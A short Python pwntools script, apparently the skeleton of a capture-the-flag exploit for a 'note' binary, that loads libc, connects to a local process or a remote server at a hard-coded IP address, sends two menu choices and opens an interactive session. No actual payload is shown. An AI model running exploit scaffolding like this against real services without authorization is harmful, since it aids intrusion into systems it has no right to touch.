#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './note'

if len(sys.argv) == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io = process(fn)
else:
    libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
    io = remote('45.76.173.177', 5678)

io.sendlineafter('>>', '3')
io.sendlineafter('(yes:1)', '1')

io.interactive()
